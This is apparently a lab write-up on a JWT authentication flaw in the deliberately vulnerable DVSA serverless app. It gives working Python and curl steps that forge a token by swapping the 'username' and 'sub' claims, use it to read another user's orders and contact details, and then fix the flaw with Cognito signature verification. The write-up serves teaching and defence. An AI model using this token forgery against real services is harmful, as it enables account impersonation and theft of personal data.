# Broken Authentication 
The Broken Authentication vulnerability in the DVSA application happens because the backend does not properly verify JSON Web Tokens (JWT). Instead of validating the token’s signature, the system directly trusts the information inside the token payload, such as "username" and "sub".

As a result, an attacker can modify the JWT payload, re-encode it, and impersonate another user. This allows unauthorized access to sensitive data such as order information.

## Vulnerability Exploting
To achieve this vulnerability, we will use the Terminal, Browser Developer Tools, Python, and Two user accounts in the DVSA that placed at least one order. The DVSA application uses JWT tokens for authentication, but the backend does not verify their integrity.

You have to follow these steps:

1. Log in to the DVSA application as User B (attacker).

2. Open Browser Developer Tools and go to the Network tab.

3. Access the "My Orders" page and capture the Authorization token (JWT).

4. Copy the API request  URL.

5. Export both the API request along with the attacker’s Authorization token (JWT) using the following commands: 
```bash

export TOKEN_B="paste the token here" 
```
and 
```bash
export API="paste the url here"
``` 

6. Log in as User C (victim) and capture their JWT token in the same way.

7. Export Authorization token (JWT) for the victim using the following commands: 
```bash
export TOKEN_C="paste the token here"
```

8.	Decode both JWT tokens to extract the "username" and "sub" fields, using this code: 
```python
python3 - <<'PY'
import os, json, base64

def decode(token):
payload = token.split(".")[1]
payload += "=" * (-len(payload) % 4)
return json.loads(base64.urlsafe_b64decode(payload.encode()))

for name in ["TOKEN_B", "TOKEN_C"]:
data = decode(os.environ[name])
print("\n" + name)
print("username:", data.get("username"))
print("sub:", data.get("sub"))
PY
```

9. Export the victim’s username using:
```bash
export VICTIM_USER="paste the victim’s username here"
```

10. Send a normal request using the attacker’s token to verify expected behavior, using:
```bash
curl -s "$API" \
-H "content-type: application/json" \
-H "authorization: $TOKEN_B" \
--data-raw '{"action":"orders"}' | jq
```

and observe that only the attacker’s orders are returned.


11. Modify the attacker’s token by replacing the "username" and "sub" values with those of the victim. using this code:
```bash
export FAKE_AS_C="$(
python3 - <<'PY'
import os, json, base64

t = os.environ["TOKEN_B"]
victim = os.environ["VICTIM_USER"]

h, p, s = t.split(".")
p += "=" * (-len(p) % 4)
data = json.loads(base64.urlsafe_b64decode(p.encode()))

# Impersonate victim
data["username"] = victim
data["sub"] = victim

newp = base64.urlsafe_b64encode(
    json.dumps(data, separators=(",", ":")).encode()
).rstrip(b"=").decode()

print(f"{h}.{newp}.{s}")
PY
)"

echo "Forged token length: ${#FAKE_AS_C}"
```


12.	Send a request to the Orders API using the forged token with the following command:
```bash
curl -s "$API" \
-H "content-type: application/json" \
-H "authorization: $FAKE_AS_C" \
--data-raw '{"action":"orders"}' | jq
```

13. Observe that the response now returns the victim’s orders instead of the attacker’s.

This confirms that the backend accepts the modified JWT without verifying its signature, allowing user impersonation.

Also, an attacker can get more information about a specific order by continue with these steps:
14. Export the victim’s order-id, using:
export ORDER_C="paste the order-id here"

15.	Use this command to get more information about the order: 
```bash
curl -s "$API" \
-H "content-type: application/json" \
-H "authorization: $FAKE_AS_C" \
--data-raw "{\"action\":\"get\",\"order-id\":\"$ORDER_C\"}" | jq
```

and observe the response which returns the victim’s order information, such as total amount, address phone and email. 

## Vulnerability Fixing
The fix for this vulnerability is to ensure that the backend properly verifies the JWT token before trusting any identity information. In the original implementation, the application decoded the token and directly trusted fields such as `username` without validating the signature. This allowed attackers to modify the token and impersonate other users.

To prevent this, the application must verify both the JWT signature and required claims before processing any request. Any token that is modified, expired, or invalid should be rejected immediately. This ensures that only legitimate users can access protected resources and restores the intended authentication boundary.

The fix was applied in the backend Lambda function responsible for handling order-related requests, specifically in the file `DVSA-ORDER-MANAGER/order-manager.js`. The original implementation extracted the Authorization header, decoded the JWT payload, and directly trusted identity fields such as `username` without verifying the token signature. This insecure behavior allowed attackers to manipulate the token and impersonate other users.

The fix was implemented through the following steps:

1. Add JWT verification logic to validate the token using Amazon Cognito public keys. Immediately after const jose = require(‘node-jose’), add this code: 
```js
const https = require('https');
let jwksCache = { keystore: null, fetchedAt: 0 };

function resp(statusCode, bodyObj) {
  return {
    statusCode,
    headers: { "Access-Control-Allow-Origin": "*" },
    body: JSON.stringify(bodyObj)
  };
}

function fetchJson(url) {
  return new Promise((resolve, reject) => {
    https.get(url, (res) => {
      let data = "";
      res.on("data", (c) => data += c);
      res.on("end", () => {
        if (res.statusCode >= 200 && res.statusCode < 300) {
          try {
            resolve(JSON.parse(data));
          } catch (e) {
            reject(e);
          }
        } else {
          reject(new Error(`HTTP ${res.statusCode}: ${data.slice(0,200)}`));
        }
      });
    }).on("error", reject);
  });
}

async function getCognitoKeystore() {
  const now = Date.now();
  if (jwksCache.keystore && (now - jwksCache.fetchedAt) < 6 * 60 * 60 * 1000) {
    return jwksCache.keystore;
  }

  const region = process.env.AWS_REGION;
  const userPoolId = process.env.userpoolid;
  const jwksUrl = `https://cognito-idp.${region}.amazonaws.com/${userPoolId}/.well-known/jwks.json`;

  const jwks = await fetchJson(jwksUrl);
  const keystore = await jose.JWK.asKeyStore(jwks);

  jwksCache = { keystore, fetchedAt: now };
  return keystore;
}

async function verifyCognitoJwt(jwt) {
  const region = process.env.AWS_REGION;
  const userPoolId = process.env.userpoolid;
  const issuer = `https://cognito-idp.${region}.amazonaws.com/${userPoolId}`;

  const keystore = await getCognitoKeystore();
  const result = await jose.JWS.createVerify(keystore).verify(jwt);
  const claims = JSON.parse(result.payload.toString("utf8"));

  // Basic validation
  if (claims.iss !== issuer) throw new Error("bad issuer");
  if (typeof claims.exp === "number" && (Date.now() / 1000) > claims.exp) throw new Error("expired");
  if (claims.token_use && !["access", "id"].includes(claims.token_use)) throw new Error("bad token_use");

  return claims;
}
```

2.	Replace the vulnerable JWT parsing logic with a secure verification process that validates the token signature and extracts trusted claims.
replace this code: 
```js

    var auth_header = headers.Authorization || headers.authorization;
    var token_sections = auth_header.split('.');
    var auth_data = jose.util.base64url.decode(token_sections[1]);
    var token = JSON.parse(auth_data);
    var user = token.username;
    var isAdmin = false;
```
by: 

```js
    var auth_header = (headers.Authorization || headers.authorization || "");
    var jwt = auth_header.replace(/^Bearer\s+/i, "").trim();

    if (!jwt) {
    return callback(null, resp(401, { status: "err", msg: "missing authorization" }));
    }

    verifyCognitoJwt(jwt).then((claims) => {
    var user = claims.username || claims["cognito:username"] || claims.sub;

    if (!user) {
        return callback(null, resp(401, { status: "err", msg: "missing subject" }));
    }

    var isAdmin = false;

```

3.	Close the promise chain at the end of the handler by adding proper error handling to reject invalid or tampered tokens.
    ```js

    }).catch((e) => {
    console.log("JWT verify failed:", e);
    return callback(null, resp(401, { status: "err", msg: "invalid token" }));
  });
      ```

 4. Save and deploy the changes. 
 5. Run the same request again to the Orders API using the previously forged JWT token with the following command:
```bash

curl -s "$API" \
-H "content-type: application/json" \
-H "authorization: $FAKE_AS_C" \
--data-raw '{"action":"orders"}' | jq
```
6. Observe that the response now returns an error message indicating that the token is invalid, and no sensitive information is leaked.
This confirms that the fix is successful, as the backend now properly verifies the JWT signature and rejects forged tokens.

